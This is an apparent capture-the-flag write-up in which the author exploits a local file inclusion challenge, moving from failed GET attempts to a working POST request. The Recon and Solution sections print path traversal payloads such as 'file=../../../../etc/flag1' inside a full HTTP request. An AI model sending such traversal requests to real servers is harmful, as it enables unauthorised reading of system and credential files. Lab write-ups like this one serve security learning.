# Challenge:

Get the information hidden in etc/flag1.

# Recon:

Open the URL and explore what's in there.

The first thing that cought my eye was the yellow banner with information.
`The input form is broken! You need to send `POST`request with`file` parameter!`
Ok, first tip noticed. Second thing I've done was using the input. I set the `foobar` inside the input, and fire the Include button.

![Screenshot 2026-01-31 at 20.12.25](images/screenshot-2026-01-31-at-20.12.25.png)

No error on the frontend, but URL has changed to following
http://10.80.191.5/challenges/chall1.php?file=foobar#

`![Screenshot 2026-01-31 at 20.17.26.png](images/screenshot-2026-01-31-at-20.17.26.png.png)

Next thing I've done was open the app Caido, and run the same request to check what's in there.
Nothing was there, the form wasn't sent, so I reloaded the page to trigger anything. That helped. I got the http history.

![Screenshot 2026-01-31 at 20.20.08.png](images/screenshot-2026-01-31-at-20.20.08.png.png)

I saw the GET request with parameter `?files=foobar`. I thought that is the entry point and time to work with that. So I started manually path traversal with
`etc/flag1`, `../../../../etc/flag1` `etc/flag1%00`, `../../../../etc/flag1%00`. Nothing happened. No error on the frontend. I've changed the http method to the POST with no result.
I sent the request to the Automate feature in Caido to set more path traversal options, but it ended with nothing.

`![[Screenshot 2026-01-31 at 20.27.04.png]](images/screenshot-2026-01-31-at-20.27.04.png.png)

I haven't idea what to do next.
I left the challenge for a while and get back to it later.

When I got back to the computer I thought it must something that I am doing wrong. I asked chat gpt for little, tiny tip, not the answer. I got

```
Second: you changed the request to POST, but the parameter is still in the URL (so it’s still being sent as GET).

If the application only reads POST data, you need to move the parameter into the request body:
`POST /challenges/chall1.php HTTP/1.1 ...  file=../../../../etc/flag1`

And then add the header:

`Content-Type: application/x-www-form-urlencoded`
```

`move the parameter into the request body:` That was it, I knew that I am doing something wrong with the request. It's been a while when I was playing with the forms, etc. I forgot that POST needs a body. Yeah, I know... xd. Also missing `Content-Type`. I've added these two things and BOOM... Lesson learned, I need get back to http basics and recall some things.

```
<div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>../../../../etc/flag1</b></h5>
	  <code>F1x3d-iNpu7-f0rrn
</code>
    </div>

```

# Solution

```
`POST` /challenges/chall1.php? HTTP/1.1
Host: 10.80.191.5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.80.191.5/challenges/chall1.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,pl;q=0.8
Content-Type: application/x-www-form-urlencoded

`file=../../../../etc/flag1`
```

What's been changed here? HTTP method to `POST`, added request body `file=../../../../etc/flag1`, and added header `Content-Type: application/x-www-form-urlencoded`.
